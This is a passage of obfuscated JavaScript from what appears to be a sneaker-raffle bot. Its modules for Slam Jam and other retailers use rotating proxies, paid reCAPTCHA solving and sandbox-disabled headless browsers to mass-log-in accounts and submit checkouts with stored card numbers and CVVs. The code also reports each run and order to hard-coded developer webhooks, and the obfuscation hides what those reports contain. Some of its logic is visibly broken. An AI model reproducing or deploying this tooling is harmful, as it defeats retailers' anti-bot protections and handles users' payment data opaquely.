                'function': async function (_0x3600b6, _0x3bf9b3, _0xd9d98) {
                    _0x51bd0a['use'](_0x5a6562()), _0x51bd0a['use'](_0x2f2194({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x474e1d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x35942c = 0x0; _0x35942c < _0x3bf9b3['length']; _0x35942c++) {
                        var _0x36b0c8;
                        if (_0x81a374 != 'yes')
                            var _0x81a374 = '', _0x51e6e5 = 0x0;
                        _0x4e8779(_0x3600b6['name'] + '\x20Task\x20' + (_0x35942c + 0x1) + '\x20/\x20' + _0x3bf9b3['length'] + '\x20||\x20File:\x20' + _0x10c107 + '\x20Proxies:\x20' + _0x68d2dc), await _0x526adb(_0x3bf9b3, _0x35942c);
                        if (_0x3bf9b3[_0x35942c]['Email'] == '' || _0x3bf9b3[_0x35942c]['Password'] == '' || _0x3bf9b3[_0x35942c]['FirstName'] == '' || _0x3bf9b3[_0x35942c]['LastName'] == '') {
                            console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x474e1d['useRandomProxy'] = ![])
                            var _0x20bf14 = _0xd9d98[_0x35942c]['split'](':');
                        else
                            var _0x27d7e3 = Math['round'](Math['random']() * (_0xd9d98['length'] - 0x1)), _0x20bf14 = _0xd9d98[_0x27d7e3]['split'](':');
                        const _0x16c74b = await _0x51bd0a['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x20bf14[0x0] + ':' + _0x20bf14[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox',
                                '--disable-web-security',
                                '--disable-features=IsolateOrigins',
                                '\x20--disable-site-isolation-trials'
                            ]
                        });
                        try {
                            const _0x267874 = await _0x16c74b['newPage']();
                            await _0x267874['authenticate']({
                                'username': '' + _0x20bf14[0x2],
                                'password': '' + _0x20bf14[0x3]
                            }), await _0x267874['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x267874['setRequestInterception'](!![]), _0x267874['on']('request', _0x42065b => {
                                _0x42065b['resourceType']() === 'image' || _0x42065b['resourceType']() === 'font' || _0x42065b['resourceType']() === 'media' ? _0x42065b['abort']() : _0x42065b['continue']();
                            }), await _0x267874['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x267874['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x267874['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x90116b(0x258), await _0x267874['waitForSelector']('#CustomerEmail'), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x267874['type']('#CustomerEmail', '' + _0x3bf9b3[_0x35942c]['Email']), await _0x90116b(0x12c), await _0x267874['type']('#CustomerPassword', '' + _0x3bf9b3[_0x35942c]['Password']), await _0x90116b(0x226), await _0x267874['$eval']('#customer_login', _0x6605bb => _0x6605bb['submit']()), await _0x90116b(0x7d0), await _0x267874['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20' + _0x5bbbd3['cyan']('Solving\x20Captcha')), await _0x267874['solveRecaptchas'](), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x267874['$eval']('.shopify-challenge__container\x20>\x20form', _0x1617ad => _0x1617ad['submit']());
                            try {
                                await _0x267874['waitForSelector']('.nav-account'), await _0x90116b(0x4b0);
                            } catch {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x267874['goto']('' + _0x3bf9b3[_0x35942c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x90116b(0xbb8), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x267874['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x267874['click']('.product-select-variant-wrapper'), await _0x90116b(0x320), await _0x267874['click']('li.product-select-variant__value[data-size=\x22' + _0x3bf9b3[_0x35942c]['Size'] + '\x22]'), await _0x90116b(0x384), await _0x267874['$eval']('#AddToCartForm-product-template-raffle', _0x151a2a => _0x151a2a['submit']()), await _0x267874['waitForSelector']('.cart-order-summary__content'), await _0x90116b(0x514), await _0x267874['goto']('https://drop.slamjam.com/checkout'), await _0x90116b(0x514), await _0x267874['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x267874['select']('#checkout_shipping_address_country', '' + _0x3bf9b3[_0x35942c]['Country']), await _0x90116b(0x200), await _0x267874['waitForSelector']('#checkout_shipping_address_first_name'), await _0x267874['type']('#checkout_shipping_address_first_name', '' + _0x3bf9b3[_0x35942c]['FirstName']), await _0x90116b(0x237), await _0x267874['type']('#checkout_shipping_address_last_name', '' + _0x3bf9b3[_0x35942c]['LastName']), await _0x90116b(0x1e0), await _0x267874['type']('#checkout_shipping_address_address1', _0x3bf9b3[_0x35942c]['Address1'] + '\x20' + _0x3bf9b3[_0x35942c]['HouseNumber']), await _0x90116b(0x514), await _0x267874['type']('#checkout_shipping_address_address2', '' + _0x3bf9b3[_0x35942c]['Address2']), await _0x90116b(0x514);
                            _0x3bf9b3[_0x35942c]['Postcode'] == undefined && (_0x3bf9b3[_0x35942c]['Postcode'] = _0x3bf9b3[_0x35942c]['Zip']);
                            await _0x267874['type']('#checkout_shipping_address_zip', '' + _0x3bf9b3[_0x35942c]['Postcode']), await _0x90116b(0x2bc), await _0x267874['type']('#checkout_shipping_address_city', '' + _0x3bf9b3[_0x35942c]['City']), await _0x90116b(0x320), await _0x267874['type']('#checkout_shipping_address_phone', '' + _0x3bf9b3[_0x35942c]['Phone']), await _0x90116b(0x320), await _0x267874['click']('#continue_button'), await _0x90116b(0xbb8), await _0x267874['waitForSelector']('.summary-title'), await _0x90116b(0x320), await _0x267874['click']('#continue_button'), await _0x90116b(0x320), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x267874['waitForSelector']('#checkout_credit_card_vault'), await _0x90116b(0x3e8);
                            var _0x557339 = await _0x267874['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x3a989c = await _0x557339['contentFrame']();
                            await _0x3a989c['click']('#number'), await _0x90116b(0x3e8), await _0x3a989c['type']('#number', '' + _0x3bf9b3[_0x35942c]['CardNumber'], { 'delay': 0x78 }), _0x557339 = await _0x267874['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x3a989c = await _0x557339['contentFrame'](), await _0x90116b(0x1c2), await _0x3a989c['click']('#name'), await _0x90116b(0x1f4), await _0x3a989c['type']('#name', '' + _0x3bf9b3[_0x35942c]['NameOnCard'], { 'delay': 0x78 }), _0x557339 = await _0x267874['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x3a989c = await _0x557339['contentFrame'](), await _0x90116b(0x1c2), await _0x3a989c['click']('#expiry'), await _0x90116b(0x1f4), await _0x3a989c['type']('#expiry', '' + _0x3bf9b3[_0x35942c]['ExpiryDate'], { 'delay': 0x78 }), _0x557339 = await _0x267874['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x3a989c = await _0x557339['contentFrame'](), await _0x90116b(0x1c2), await _0x3a989c['click']('#verification_value'), await _0x90116b(0x1f4), await _0x3a989c['type']('#verification_value', '' + _0x3bf9b3[_0x35942c]['CVV'], { 'delay': 0x78 }), await _0x267874['$eval']('#accepts-flag-raffle', _0x248ac9 => _0x248ac9['click']()), await _0x90116b(0x7d0), console['log'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Processing\x20Order'), await _0x267874['$eval']('#continue_button', _0x10fe95 => _0x10fe95['click']()), await _0x90116b(0x1b58), await _0x267874['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x267874['$eval']('.edit_checkout.animate-floating-labels', _0x40e77c => _0x40e77c['submit']()), await _0x90116b(0x7d0);
                            try {
                                await _0x267874['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x81a374 = 'no', _0x2812a5(_0x3bf9b3[_0x35942c], _0x3600b6), console['log'](_0x5bbbd3['green'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x10a4ac) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x10a4ac['message']);
                            }
                            var _0x589a6a = await _0x476a56(_0x3bf9b3[_0x35942c], _0x3600b6, 'dev', ![]), _0xdcefc9 = await _0x476a56(_0x3bf9b3[_0x35942c], _0x3600b6, 'pub', ![]);
                            const _0x309feb = {
                                'succesDEVMSG': { 'embeds': [_0x589a6a] },
                                'succesPUBMSG': { 'embeds': [_0xdcefc9] }
                            };
                            try {
                                _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], _0x309feb['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x5e16d4, _0x309feb['succesDEVMSG']), await _0x90116b(0xc8), await _0x2860ef(_0x3c50b7, _0x309feb['succesPUBMSG']);
                            } catch (_0x38f766) {
                                console['log'](_0x5bbbd3['yellow'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x38f766));
                            }
                        } catch (_0x34c473) {
                            console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x211f0b[taskModule]['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20' + _0x34c473)), _0x36b0c8 = '' + _0x34c473;
                            var _0x5f08a2 = await _0x476a56(kickz[_0x35942c], _0x3600b6, 'dev', !![], _0x36b0c8);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x5f08a2] }, _0x474e1d['webhook'] != undefined && _0x474e1d['webhook'] != '' && await _0x2860ef(_0x474e1d['webhook'], EMBEDS['errorDEV']), await _0x2860ef(_0x406b45, EMBEDS['errorDEV']), _0x81a374 = 'yes';
                        } finally {
                            _0x16c74b && _0x16c74b['close']();
                            if (_0x81a374 == 'yes' && _0x51e6e5 != 0x5 && _0x36b0c8 != 'Size\x20Not\x20Found') {
                                console['log'](_0x5bbbd3['red'](_0xd645bd() + '\x20[' + _0x3600b6['name'] + ']\x20Task\x20' + (_0x35942c + 0x1) + '\x20:\x20Retrying')), _0x35942c = _0x35942c - 0x1, _0x51e6e5 = _0x51e6e5 + 0x1;
                                continue;
                            }
                            _0x81a374 == 'yes' && _0x51e6e5 >= 0x5 && (_0x78fa55(_0x3bf9b3[_0x35942c], _0x3600b6), _0x81a374 = 'no', _0x51e6e5 = 0x0), console['log']('Waiting\x20for\x20' + _0x474e1d['delay'] + '\x20ms'), await _0x90116b(_0x474e1d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0xa47265) {
                    var _0x1c5daa = await _0x3402a9(), _0x381ed4 = _0x396fe9['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x26ee61 = _0x5315ab['parse'](_0x381ed4, { 'header': !![] })['data'];
                    for (var _0x2d3534 = 0x0; _0x2d3534 < _0x26ee61['length']; _0x2d3534++) {
                        var _0x5590e8 = _0x26ee61[_0x2d3534]['Store'], _0xbe37ce = _0x26ee61[_0x2d3534]['Mode'];
                        for (var _0x36aca8 of _0x211f0b) {
                            const _0x2c0eef = _0x36aca8['name']['includes'](_0x5590e8);
                            if (!_0x2c0eef)
                                continue;
                            for (mode of _0x36aca8['modules']) {
                                if (mode['name'] == _0xbe37ce) {
                                    console['log']('Running\x20' + _0x5bbbd3['cyan'](mode['name'])), await mode['function'](mode, [_0x26ee61[_0x2d3534]], _0x1c5daa);
                                    var _0x34f925 = _0x381ed4['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x396fe9['writeFileSync']('../failed-tasks.csv', _0x34f925);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x73d011 = await _0x5c634a['get']('Answer');
                    if (_0x73d011['Answer']['toLowerCase']() == 'y') {
                        _0x396fe9['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x90116b(0x3e8);
                        return;
                    }
                    if (_0x73d011['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x90116b(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x90116b(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x4b7160(_0x3e78df) {
    var _0x5705d7 = await _0x3402a9(), _0x42ec0d = _0x396fe9['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x31d7d9 = _0x5315ab['parse'](_0x42ec0d, { 'header': !![] })['data'];
    for (var _0x10ed9d = 0x0; _0x10ed9d < _0x31d7d9['length']; _0x10ed9d++) {
        var _0x457d6f = _0x31d7d9[_0x10ed9d]['Store'], _0x3a70ba = _0x31d7d9[_0x10ed9d]['Mode'];
        for (var _0xa0b3d of _0x211f0b) {
            const _0x55ff58 = _0xa0b3d['name']['includes'](_0x457d6f);
            if (_0x55ff58)
                for (mode of _0x211f0b[_0xa0b3d]['modules']) {
                    const _0x427d9b = mode['name']['includes'](_0x3a70ba);
                    _0x427d9b && (_0x3e78df = mode['name'], await mode['function'](_0x3e78df, _0x31d7d9[_0x10ed9d], _0x5705d7));
                }
        }
    }
}
async function _0x51a968() {
    await _0x27f0ed(), console['clear']();
    if (_0x1144ef != 'devkey') {
        let _0x13f6b4 = await _0x2dd078['autoUpdate']();
        if (_0x13f6b4 === 'yes')
            return _0x29257a('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x21e919 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x90116b(0x2710);
        ;
    }
    await _0xf81790(_0x21e919);
    if (_0x384e04 === ![])
        return console['log']('Closing\x20Browser'), await _0x90116b(0xbb8);
    else
        try {
            var _0x3b52f6 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x54e6a5
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1144ef
                    }
                ]
            }];
            const _0x4b724 = { 'embeds': _0x3b52f6 };
            var _0x2136b5 = await _0x476a56(null, null, 'open', ![]);
            const _0x1a79ee = { 'openDEVMSG': { 'embeds': [_0x2136b5] } };
            await _0x2860ef(_0x24519b, _0x1a79ee['openDEVMSG']);
            async function _0x5eef04() {
                _0x4e8779('JRaffles\x20' + _0x1144ef), console['clear'](), console['log']('Welcome\x20to\x20' + _0x5bbbd3['cyan']('JRaffles();') + '\x20' + _0x1144ef), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x15c743 = 0x0; _0x15c743 < _0x211f0b['length'] - 0x4; _0x15c743++) {
                    if (_0x15c743 >= 0xa) {
                        console['log']('\x20(' + _0x15c743 + ')\x20[' + _0x211f0b[_0x15c743]['name'] + ']');
                        continue;
                    }
                    if (_0x211f0b[_0x15c743]['name'] === 'Reload\x20Settings' || _0x211f0b[_0x15c743]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x15c743 + ')\x20\x20[' + _0x211f0b[_0x15c743]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x211f0b['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x211f0b['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x211f0b['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x211f0b['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x2f2406();
                if (taskModule > _0x211f0b['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x90116b(0x3e8), _0x5eef04();
                if (_0x211f0b[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                    var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x2) {
                        var _0x1e467e = await _0x3402a9(), _0x56e319 = await _0x3a7658();
                        _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x56e319), await _0x50047c['function'](_0x50047c, _0x56e319, _0x1e467e);
                    } else {
                        if (taskFunction == 0x0) {
                            var _0x1e467e = await _0x3402a9(), _0x56e319 = await _0x3a7658();
                            _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x56e319), await _0x50047c['function'](_0x50047c, _0x56e319, _0x1e467e);
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1e467e = await _0x3402a9();
                                await _0x50047c['function'](_0x50047c, links, _0x1e467e);
                            }
                        }
                    }
                    return _0x5eef04();
                }
                if (_0x211f0b[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                        var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x1e467e = await _0x3402a9(), _0x4efb18 = await _0x3a7658();
                            _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x4efb18), await _0x50047c['function'](_0x50047c, _0x4efb18, _0x1e467e);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x1e467e = await _0x3402a9(), _0x4efb18 = await _0x3a7658();
                                _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x4efb18), await _0x50047c['function'](_0x50047c, _0x4efb18, _0x1e467e);
                            }
                        }
                    } catch (_0x4412d0) {
                        console['log'](_0x4412d0), await _0x90116b(0xfa0);
                    }
                    return _0x5eef04();
                }
                if (_0x211f0b[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                    var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x1e467e = await _0x3402a9();
                        return await _0x50047c['function'](_0x50047c, _0x1e467e), _0x5eef04();
                    }
                    var _0x1e467e = await _0x3402a9(), _0x3ef604 = await _0x3a7658();
                    return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x3ef604), await _0x50047c['function'](_0x50047c, _0x3ef604, _0x1e467e), _0x5eef04();
                }
                if (_0x211f0b[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                    var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x1e467e = await _0x3402a9(), _0x3ef604 = await _0x3a7658();
                    return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x3ef604), await _0x50047c['function'](_0x50047c, _0x3ef604, _0x1e467e), _0x5eef04();
                } else {
                    if (_0x211f0b[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                        var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x1e467e = await _0x3402a9(), _0x27f687 = await _0x3a7658();
                            return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x27f687), await _0x50047c['function'](_0x50047c, _0x27f687, _0x1e467e), _0x5eef04();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x1e467e = await _0x3402a9();
                                return await _0x50047c['function'](_0x50047c, links, _0x1e467e), _0x5eef04();
                            }
                        }
                        ;
                    } else {
                        if (_0x211f0b[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                            var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction], _0x1e467e = await _0x3402a9(), _0x3508e2 = await _0x3a7658();
                            return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x3508e2), await _0x50047c['function'](_0x50047c, _0x3508e2, _0x1e467e), await _0x90116b(0x1388), _0x5eef04();
                        } else {
                            if (_0x211f0b[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x1e467e = await _0x3402a9(), _0x27f687 = await _0x3a7658();
                                    return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x27f687), await _0x50047c['function'](_0x50047c, _0x27f687, _0x1e467e), _0x5eef04();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x1e467e = await _0x3402a9();
                                        return await _0x50047c['function'](_0x50047c, links, _0x1e467e), _0x5eef04();
                                    }
                                }
                                ;
                            } else {
                                if (_0x211f0b[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                    var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x4b9392('https://bouncewear.com/nl/account/register', _0x50047c);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x211f0b[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                        var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x1e467e = await _0x3402a9(), _0x5246bf = await _0x3a7658();
                                            return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x5246bf), await _0x50047c['function'](_0x50047c, _0x5246bf, _0x1e467e), _0x5eef04();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x1e467e = await _0x3402a9(), _0x5246bf = await _0x3a7658();
                                                return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x5246bf), await _0x50047c['function'](_0x50047c, _0x5246bf, _0x1e467e), _0x5eef04();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x211f0b[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                            var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x1e467e = await _0x3402a9(), _0x158d8c = await _0x3a7658();
                                                return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x158d8c), await _0x50047c['function'](_0x50047c, _0x158d8c, _0x1e467e), _0x5eef04();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x1e467e = await _0x3402a9(), _0x158d8c = await _0x3a7658();
                                                    return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x158d8c), await _0x50047c['function'](_0x50047c, _0x158d8c, _0x1e467e), _0x5eef04();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x211f0b[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                                var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x1e467e = await _0x3402a9(), _0x4833b1 = await _0x3a7658();
                                                    return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x4833b1), await _0x50047c['function'](_0x50047c, _0x4833b1, _0x1e467e), _0x5eef04();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x1e467e = await _0x3402a9(), _0x4833b1 = await _0x3a7658();
                                                        return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x4833b1), await _0x50047c['function'](_0x50047c, _0x4833b1, _0x1e467e), _0x5eef04();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x211f0b[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                                    var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x1e467e = await _0x3402a9(), _0x1b517a = await _0x3a7658();
                                                        return _0x474e1d['shuffleTasks'] && await _0xfd8fd9(_0x1b517a), await _0x50047c['function'](_0x50047c, _0x1b517a, _0x1e467e), _0x5eef04();
                                                    }
                                                } else {
                                                    if (_0x211f0b[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x90116b(0x3e8), _0x5eef04();
                                                    else {
                                                        if (_0x211f0b[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x5d6dab = _0x211f0b[taskModule]['name'], _0x1e467e = await _0x3402a9();
                                                            await _0x453825(links, _0x5d6dab, _0x1e467e);
                                                        } else {
                                                            if (_0x211f0b[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0x37fc05(_0x211f0b[taskModule]['modules']);
                                                                var _0x50047c = _0x211f0b[taskModule]['modules'][taskFunction];
                                                                return await _0x50047c['function'](_0x50047c), _0x5eef04();
                                                            } else {
                                                                if (_0x211f0b[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x52fb26 = 0x0;
                                                                    for (const _0x5e0376 in _0x474e1d) {
                                                                        console['log']('(' + _0x52fb26 + ')\x20' + _0x5e0376 + '\x20:\x20' + _0x474e1d[_0x5e0376]), _0x52fb26++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x52fb26 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0x2bf1a2 = await _0x37eafa();
                                                                    if (_0x2bf1a2 == _0x52fb26)
                                                                        return _0x5eef04();
                                                                    console['clear'];
                                                                    var _0x36f1df = 0x0;
                                                                    for (var _0x2c07eb in _0x474e1d) {
                                                                        if (_0x2bf1a2 == _0x36f1df) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x2c07eb + '\x20:'), _0x474e1d[_0x2c07eb] = await _0x29dbde(), _0x396fe9['writeFileSync']('../settings.json', JSON['stringify'](_0x474e1d));
                                                                            break;
                                                                        } else
                                                                            _0x36f1df++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0x90116b(0xbb8), _0x5eef04();
                                                                } else {
                                                                    if (_0x211f0b[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x27f0ed(), _0x5eef04();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x211f0b[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x333009 = await _0x4e13f0();
                                                                            _0x333009 == 'ModuleVoorDeBoys' ? (await _0x1d0fc7(), await _0x507da9(), await afewFunction(_0x20cf71[_0x1655a1], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x90116b(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x5eef04();
        } catch (_0x59d595) {
            return console['log'](_0x59d595), await _0x90116b(0x3a98);
        }
}
;
_0x4e8779('JRaffles\x20' + _0x1144ef), _0x27f0ed();
try {
    _0x51a968();
} catch (_0x250e3b) {
    var _0x551d16 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x54e6a5
            },
            {
                'name': 'Version',
                'value': '' + _0x1144ef
            },
